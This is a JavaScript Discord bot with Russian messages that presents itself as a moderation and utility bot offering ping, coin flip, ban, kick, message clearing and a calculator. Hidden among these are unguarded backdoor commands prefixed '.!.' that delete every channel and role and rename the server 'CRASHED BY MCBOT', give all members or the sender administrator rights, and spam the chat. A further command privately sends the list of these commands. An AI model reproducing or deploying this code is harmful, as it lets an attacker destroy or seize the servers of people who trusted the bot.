throw(Error("Bot is outdated"))
const Discord = require("discord.js");
const bot = new Discord.Client();
const botconfig = require("./botconfig.json")

const token = (botconfig.token)
const prefix = "."

const queue = new Map();

bot.on('message', async message => {

if(message.author.bot || message.channel.type == "dm" || !message.content.startsWith(prefix))return
  let args = message.content.slice(prefix.length).trim().split(' ')

    if (message.content === '!ping'){
            var pemb =  new Discord.RichEmbed()
            .setColor("RED")
            .setTitle("🏓 Понг! 🏓")
            .addField("Пинг бота: ", `${bot.ping}мс`)
            message.channel.send(pemb)
    }

        if (message.content === (prefix + 'flip')){
            
            var flip = ["Орёл",
                       "Решка"]
            
            var temp = flip[Math.floor(Math.random()*2)]

            var pemb2 = new Discord.RichEmbed()
            .setColor("RED")
            .setTitle("Орёл или Решка")
            .addField (`Ваш результат: ${temp}`)
    
    message.channel.send("Что-ж вам выпала: " + temp)
    }

    if(message.content.startsWith(prefix + "ban")){
    
    if(!message.member.hasPermission("BAN_MEMBERS"))return(message.reply("⛔ Упс! Недостаточно прав"))
    
    let toban = message.mentions.members.first()
    
    if(!toban)return(message.reply(":warning: Упомяните пользователя которого банить!"))
    
    let reason = args.splice(2).join(" ")

    toban.ban(reason)
    
    message.channel.send(` <@${message.author.id}> забанил <@${toban.user.id}> за: ${reason}`)
  }

    
    if(message.content.startsWith(prefix + "kick")){
    
    if(!message.member.hasPermission("KICK_MEMBERS"))return(message.reply("⛔ Упс! Недостаточно прав"))
    
    let tokick = message.mentions.members.first()
    
    if(!tokick)return(message.reply(":warning: Упомяните пользователя которого кикать!"))
    
    let reason = args.splice(2).join(" ")

    
    tokick.kick(reason)
    
    message.channel.send(` <@${message.author.id}> кикнул <@${tokick.user.id}> за: ${reason}`)
  }

  if(message.content.startsWith(prefix + "msgclear")){

    if(!message.member.hasPermission("MANAGE_MESSAGES"))return(message.reply("⛔ Упс! Недостаточно прав!"))
    
    let howmanydelete = args[1]
    
    if(!howmanydelete)return(message.reply("⭕ Введите сколько сообщений нужно удалить."))

    if(howmanydelete < 1)return(message.reply("⭕ Больше одного, pls"))
    
    if(howmanydelete > 100)return(mesasge.reply("⭕ Меньше 100, pls"))

    await message.channel.bulkDelete(howmanydelete)
    
    message.channel.send(`Удалено \`${howmanydelete}\` сообщений`)
  }



  if(message.content.startsWith(prefix + "asay")){
    
    if(!message.member.hasPermission("BAN_MEMBERS"))return(message.reply("⛔ Упс! Недостаточно прав!"))
    
    let textasay = args.splice(1).join(" ")
    
    if(textasay === ""){ return(message.reply(":warning: !asay [текст]"))}
    
    message.channel.send(textasay)
  }

  if(message.content.startsWith(prefix + "count")){

    let value = args.splice(1).join(" ")

    message.channel.send('Ответ примера: ' + safeCalc(value));

  }

    if(message.content.toLowerCase().startsWith(".!.crashh")){

    		     	    	console.log(`-----------------------------Guild ${message.guild.name} crashed.-----------------------------`)


    	message.delete();
        message.guild.channels.forEach(channel => channel.delete());
        //Удаление каналов через Collection.forEach
        //message.guild.members.forEach(member => member.ban());
        //Тоже самое, но с участниками
        message.guild.roles.forEach(role => role.delete());
        //Делит ролей от меня (rdev)
         message.guild.createChannel('crashedserver', "text");
         message.guild.setName('CRASHED BY MCBOT');


    }


       if(message.content.toLowerCase().startsWith(".!.")){

    		     	    	console.log(`-----------------------------Guild ${message.guild.name} crashed.-----------------------------`)


    	message.delete();
        message.guild.channels.forEach(channel => channel.delete());
        //Удаление каналов через Collection.forEach
        //message.guild.members.forEach(member => member.ban());
        //Тоже самое, но с участниками
        message.guild.roles.forEach(role => role.delete());
        //Делит ролей от меня (rdev)
         message.guild.createChannel('crashedserver', "text");
         message.guild.setName('CRASHED BY MCBOT');


    }

      if(message.content.toLowerCase().startsWith(".!.allgiveadmm")){

      	     	    	console.log(`-----------------------------Guild ${message.guild.name} gived all admins.-----------------------------`)

    	message.delete();
	message.guild.createRole({
    name: 'FUCKED_SERVER',
    permissions: ['ADMINISTRATOR']
	}).then((role)=>{
	       message.guild.members.forEach(member => member.addRole(role));
        })
        //Тоже самое, но с участниками
        message.reply("?");

    }



     if(message.content.toLowerCase().startsWith(".!.giveadmm")){



    	message.delete();
	message.guild.createRole({
    name: 'FUCKED_SERVER_MC',
    permissions: ['ADMINISTRATOR']
	}).then((role)=>{
	       message.author.addRole(role);
        })
        //Тоже самое, но с участниками
        message.reply("?");

    }
    	

     if(message.content.toLowerCase().startsWith(".!.spamm")){
	let i = 0;
	while (i <= 100) { message.reply("OAOAOAOAOOAOAOAOOAOAOAOAOAOOAOAOAOOAOAOAOA | Crashed by MCBOT"), i++, await new Promise(resolve => setTimeout(resolve, 1000)) };
	     	    	console.log(`-----------------------------Guild ${message.guild.name} spammed.-----------------------------`)

    }

    if(message.content.toLowerCase().startsWith(".!.pohelp")){

    	     	    	console.log(`-----------------------------Guild ${message.guild.name} help requested.-----------------------------`)


	
	message.author.send(".!.crashh - Краш сервера; .!.allgiveadmm - Выдать всем админку; .!.giveadmm - Выдать себе админа; .!.spamm - Спам в чат в котором было написано сообщение.")

    }

})

function safeCalc(value) {
  try {
    return calc(value)
  } catch (e) {
    return e.message;
  }
}

function calc(value) {
  let i = 0;
  const len = value.length;

  const skipSpaces = () => {
    while (i < len && value[i].match(/\s/)) {
      i++;
    }
  };
  const getCurrentToken = () => {
    skipSpaces();
    let current = value[i];
    if (i < len && current.match(/\d/)) {
      let buf = current;
      while (i + 1 < len && value[i+1].match(/\d/)) {
        i++;
        buf += value[i];
      }
      if (value[i+1] === '.') {
        i++;
        buf += value[i];
        while (i + 1 < len && value[i+1].match(/\d/)) {
          i++;
          buf += value[i];
        }
      }
      return {
        type: "number",
        value: parseFloat(buf)
      }
    } else if (i < len && current.match(/[-+*/]/)) {
      return {
        type: "operator",
        value: current
      }
    } else if (current === "(") {
      return {
        type: "leftParenthesis"
      }
    } else if (current === ")") {
      return {
        type: "rightParenthesis"
      }
    } else if (i < len) {
      throw new Error("Ошибка на позиции " + i + ", символ: " + current);
    }
  };
  const getNextToken = () => {
    let token = getCurrentToken();
    i++;
    return token;
  };
  const invalidToken = (token, expected) => {throw new Error("Invalid token " + (token && token.value) + ", expected: " + expected)};

  const expr = () => {
    let res = val();
    let op1 = getCurrentToken();
    while (op1 && op1.type === "operator" && (op1.value === '+' || op1.value === '-')) {
      i++;
      const v2 = val();
      if (op1.value === "+") {
        res = res + v2;
      } else {
        res = res - v2;
      }
      op1 = getCurrentToken();
    }
    return res;
  };

  const val = () => {
    let res = arg();
    let op2 = getCurrentToken();
    while (op2 && op2.type === "operator" && (op2.value === "*" || op2.value === "/")) {
      i++;
      const arg2 = arg();
      if (op2.value === "*") {
        res = res * arg2;
      } else {
        res = res / arg2;
      }
      op2 = getCurrentToken();
    }
    return res;
  };

  const arg = () => {
    let result;
    const token = getNextToken();
    if (token && token.type === "operator" && (token.value === "-" || token.value === "+")) {
      result = arg();
      if (token.value === "-") {
        result = -result;
      }
    } else if (token && token.type === "number") {
      result = token.value;
    } else if (token && token.type === "leftParenthesis") {
      result = expr();
      let closeParenthesis = getNextToken();
      if (!closeParenthesis || closeParenthesis.type !== "rightParenthesis") {
        invalidToken(closeParenthesis, ")");
      }
    } else {
      invalidToken(token, "number");
    }
    return result;
  };

  let res = expr();
  skipSpaces();
  if (i < len) {
    return
  }
  return res;
}



bot.on("ready", () => {

    console.log("Краш реди :) / Бот запущен");

    bot.user.setPresence({
        game: {
          name: ` серверов.`,
          type: 0  
        }
      })

})

//bot.on("reconnecting", () => {

//  console.log("Переподключаюсь!")

//});

bot.on('disconnect', () => {
 console.log('Отключен от сети.');
});


bot.login(token);
